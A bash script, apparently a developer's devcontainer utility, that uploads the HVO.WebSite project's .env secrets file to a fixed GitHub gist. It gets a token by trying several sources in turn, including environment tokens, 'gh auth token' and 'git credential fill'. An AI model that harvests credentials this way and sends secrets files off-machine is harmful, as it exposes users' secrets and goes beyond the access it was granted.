#!/bin/bash
GIST_ID="f343db002d980ebe5fcc51413b0b7227"
ENV_FILE="/workspaces/HVO.WebSite/.env"

test_token() {
    local token="$1"
    if [[ -z "$token" ]]; then return 1; fi
    curl -s -L -f -o /dev/null -H "Authorization: token $token" "https://api.github.com/gists/$GIST_ID"
}

update_gist() {
    local token="$1"
    local source="$2"

    # Try using gh CLI with the token
    if GH_TOKEN="$token" gh gist edit "$GIST_ID" --filename ".env" "$ENV_FILE" > /dev/null 2>&1; then
        echo "SUCCESS: Worked with $source"
        return 0
    fi

    # Fallback to curl if gh fails. Use perl to JSON-escape the content if python3/node are missing
    CONTENT=$(perl -MJSON::PP -e '$/=undef; print encode_json(<>)' < "$ENV_FILE") || \
    CONTENT=$(perl -pe 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g; s/\r/\\r/g; s/\t/\\t/g; $_ = "\"" . $_ . "\""' < "$ENV_FILE")

    if curl -s -L -f -X PATCH -H "Authorization: token $token" \
        -H "Content-Type: application/json" \
        -d "{\"files\":{\".env\":{\"content\":$CONTENT}}}" \
        "https://api.github.com/gists/$GIST_ID" > /dev/null; then
        echo "SUCCESS: Worked with $source (via API)"
        return 0
    fi

    return 1
}

# Try GH_PAT
if test_token "$GH_PAT"; then
    if update_gist "$GH_PAT" "GH_PAT"; then exit 0; fi
fi

# Try GH_TOKEN
if test_token "$GH_TOKEN"; then
    if update_gist "$GH_TOKEN" "GH_TOKEN"; then exit 0; fi
fi

# Try GITHUB_TOKEN
if test_token "$GITHUB_TOKEN"; then
    if update_gist "$GITHUB_TOKEN" "GITHUB_TOKEN"; then exit 0; fi
fi

# Try gh auth token
TOKEN_GH=$(gh auth token 2>/dev/null)
if test_token "$TOKEN_GH"; then
    if update_gist "$TOKEN_GH" "gh auth token"; then exit 0; fi
fi

# Try git credential fill
TOKEN_GIT=$(echo -e "protocol=https\nhost=github.com\n" | git credential fill 2>/dev/null | grep "^password=" | cut -d= -f2)
if test_token "$TOKEN_GIT"; then
    if update_gist "$TOKEN_GIT" "git credential fill"; then exit 0; fi
fi

echo "FAILURE: No working credential source found."
exit 1
